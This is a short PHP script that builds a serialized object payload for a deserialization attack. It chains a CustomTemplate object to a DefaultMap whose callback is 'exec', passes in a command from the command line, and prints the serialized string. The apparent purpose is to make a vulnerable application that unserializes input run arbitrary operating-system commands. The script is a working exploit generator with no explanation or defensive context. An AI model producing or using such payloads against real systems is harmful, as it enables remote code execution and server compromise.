<?php

class CustomTemplate {
    public $default_desc_type;
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->default_desc_type = $default_desc_type;
        $this->desc = $desc;
    }
}

class DefaultMap {
    public $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }
}

$x = new CustomTemplate(
    $argv[1],
    new DefaultMap('exec')
);
echo serialize($x)
?>